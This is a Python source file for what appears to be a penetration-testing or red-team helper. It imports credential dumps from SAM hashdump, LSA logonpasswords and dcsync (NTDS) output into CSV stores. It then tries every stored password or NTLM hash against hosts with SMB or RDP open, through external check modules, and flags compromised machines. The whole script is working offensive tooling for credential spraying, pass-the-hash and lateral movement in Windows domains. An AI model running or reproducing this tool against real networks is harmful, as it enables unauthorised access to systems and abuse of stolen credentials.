#!/usr/bin/python3
import os
import re
import sys
import argparse
import pandas as pd
from termcolor import cprint
from tabulate import tabulate

import nthash

class Manager:
    FILE = None
    cols = []

    def __init__(self):
        self.modified = False
        if self.FILE is None:
            raise NotImplementedError
        if os.path.exists(self.FILE):
            #print('[+] Load existing file')
            self.df = pd.read_csv(self.FILE, usecols=self.cols, na_filter=False)
        else:
            #print('[-] Create for you')
            self.df = pd.DataFrame([], columns=self.cols, dtype=str)
            self.modified = True
            self.export()
        self.init()

    def init(self):
        pass

    def export(self):
        if self.modified:
            self.df.fillna('', inplace=True)
            self.df.to_csv(self.FILE, index=False)
            print('[+] Export to "%s"' % (self.FILE))
            self.modified = False

    def _list(self, *args, **kwargs):
        return self.df.values.tolist()
    def list(self, *args, **kwargs):
        return self._list(*args, **kwargs)

    def __str__(self):
        return tabulate(self.df, headers='keys', tablefmt='psql')

class CredManager(Manager):
    FILE = 'credential.csv'
    cols = ['User', 'Pass', 'NTLM', 'Domain']

    def init(self):
        changed = False
        for _, row in self.df.iterrows():
            if row['Pass'] and nthash.convert(row['Pass']) != row['NTLM']:
                self.df.at[_, 'NTLM'] = nthash.convert(row['Pass'])
                changed = True
        if changed:
            self.export()

    def _list(self, pwdOnly=False):
        # automatically skip machine account
        _df = self.df[self.df['User'].apply(lambda x: not x.endswith('$'))]
        if pwdOnly:
            return _df[_df['Pass'] != ''].values.tolist()
        return _df.values.tolist()

    def add(self, domain, username, password):
        if (self.df['Domain'] == domain).any() and (self.df['User'] == username).any() and (self.df['Pass'] == password).any():
            return
        self.modified = True
        self.df = self.df.append(dict(User=username, Pass=password, Domain=domain), ignore_index=True)
    def addH(self, domain, username, ntlm):
        if (self.df['Domain'] == domain).any() and (self.df['User'] == username).any() and (self.df['NTLM'] == ntlm).any():
            return
        self.modified = True
        self.df = self.df.append(dict(User=username, NTLM=ntlm, Domain=domain), ignore_index=True)

class HostManager(Manager):
    FILE = 'host.csv'
    cols = ['IP', 'HOST', 'Ports']

    def add(self, ip, host=None):
        # check exists
        if (self.df['IP'] == ip).any():
            for i in self.df.index[self.df['IP'] == ip].tolist():
                if host and self.df.iloc[i]['HOST'] is None:
                    self.modified = True
                    self.df.at[i, 'HOST'] = host
            return
        
        self.modified = True
        self.df = self.df.append(dict(IP=ip, HOST=host), ignore_index=True)

class RecordManager(Manager):
    FILE = 'record.csv'
    cols = ['IP', 'User', 'Pass', 'NTLM', 'Domain', 'Protocol', 'Status']

    def add(self, item):
        if self.exists(item[:-1]):
            return
        self.modified = True
        self.df = self.df.append(dict(zip(self.cols, item)), ignore_index=True)
    def exists(self, item):
        for _, data in self.df.iterrows():
            eq = True
            for i, val in enumerate(item):
                eq &= val == data[self.cols[i]]
            if eq:
                print(item)
                print('[~] Skip tried combination')
                return True
        return False
    def canExec(self):
        # cme smb pwned
        pwn_cme = self.df[(self.df['Protocol'] == 'cme-smb') & (self.df['Status'] == 2)]
        pwn_rdp = self.df[(self.df['Protocol'] == 'rdp') & (self.df['Status'] == 1)]
        # sam, lsa, dcsync pwned
        pwn_local = self.df[self.df['Protocol'] == 'localdump']
        pwndf = pd.concat([pwn_cme, pwn_rdp, pwn_local])
        print(pwndf)

def highlight(s, level=0):
    if level >= 2:
        cprint(s, 'yellow', attrs=['bold'])
    elif level >= 1:
        cprint(s, 'green', attrs=['bold'])
    else:
        cprint(s, 'blue')

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--cme', action='store_true')
    parser.add_argument('--rdp', action='store_true')
    parser.add_argument('--import-sam', dest='_sam')
    parser.add_argument('--import-lsa', dest='_lsa')
    parser.add_argument('--import-ntds', dest='_ntds')
    parser.add_argument('-t', '--itarget-ip', dest='itarget_ip', help='must be IPv4 format')
    parser.add_argument('-T', '--itarget-name', dest='itarget_name')
    parser.add_argument('--reset', action='store_true')
    parser.add_argument('--init', action='store_true')
    parser.add_argument('--debug', action='store_true')
    return parser.parse_args()

args = parse_args()

if args.reset:
    files = [CredManager.FILE, HostManager.FILE, RecordManager.FILE]
    answer = input('Do you want to clear %s? [y/N] ' % ', '.join(files)).strip()
    if answer == 'y':
        for f in files:
            os.remove(f)
        print('Reset success')
    else:
        print('Canceled')
    exit(0)

cm = CredManager()
hm = HostManager()
rm = RecordManager()

if args._sam or args._lsa or args._ntds:
    if args.itarget_ip is None:
        print('Please specify import target with `-t <ip>`')
        exit(0)
    if args.debug:
        print(cm)
        print(hm)
        print(rm)
    hm.add(args.itarget_ip, args.itarget_name)

if args._sam:
    print('Parsing `hashdump`(--sam) result')
    with open(args._sam) as f:
        for line in f:
            m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
            _domain, _user, _ntlm = '.', m.group(1), m.group(2)
            cm.addH(_domain, _user, _ntlm)
            rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 0))
        cm.export()


if args._lsa:
    print('Parsing `logonpasswords`(--lsa) result')
    builtinkeys = ['dpapi_machinekey', 'dpapi_userkey', 'NL$KM']
    with open(args._lsa) as f:
        for line in f:
            m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
            if m is not None:
                _domain, _user, _ntlm = '.', m.group(1), m.group(2)
                if '\\' in _user:
                    _domain, _user = _user.split('\\', 1)
                cm.addH(_domain, _user, _ntlm)
                rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 1))
            if line.count(':') == 1: # clear-text password
                du, _pass = line.split(':')
                if du in builtinkeys:
                    continue
                _domain = _user = ''
                if '\\' in du:
                    _domain, _user = du.split('\\', 1)
                else:
                    _user, _domain = du.split('@', 1)
                cm.add(_domain, _user, _pass)
                rm.add((args.itarget_ip, _user, _pass, '', _domain, 'localdump', 1))
        cm.export()

if args._ntds:
    print('Parsing `dcsync`(--ntds) result')
    with open(args._ntds) as f:
        for line in f:
            m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
            _domain, _user, _ntlm = '.', m.group(1), m.group(2)
            if '\\' in _user:
                _domain, _user = _user.split('\\', 1)
            cm.addH(_domain, _user, _ntlm)
            rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 2))
        cm.export()

print(cm)
print(hm)
print(rm)
print(rm.canExec())

if args.cme:
    import cmecheck
    proto = 'cme-smb'
    for ip, host, portsS in hm.list():
        ports = portsS.split(' ')
        if '445' not in ports:
            continue
        isInternal = ip.startswith('172')
        for u, p, n, d in cm.list():
            if rm.exists((ip, u, p, n, d, proto)):
                continue
            status = cmecheck.run(ip, username=u, password=p, ntlm=n, domain=d, useProxy=isInternal)
            rm.add((ip, u, p, n, d, proto, status))
            d = d or '.'
            if status == 2:
                highlight('[+][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip), 2)
            elif status == 1:
                highlight('[|][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip), 1)
            elif status == 0:
                print('[-][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip))

if args.rdp:
    import rdpcheck
    proto = 'rdp'
    for ip, host, portsS in hm.list():
        ports = portsS.split(' ')
        if '3389' not in ports:
            continue
        isInternal = ip.startswith('172')
        for u, p, _, d in cm.list(True):
            if rm.exists((ip, u, p, _, d, proto)):
                continue
            status = rdpcheck.run(ip, username=u, password=p, domain=d, useProxy=isInternal)
            rm.add((ip, u, p, _, d, proto, status))
            d = d or '.'
            if status == 1:
                highlight('[+][rdp] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip), 1)
            elif status == 0:
                print('[-][rdp] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip))

hm.export()
rm.export()
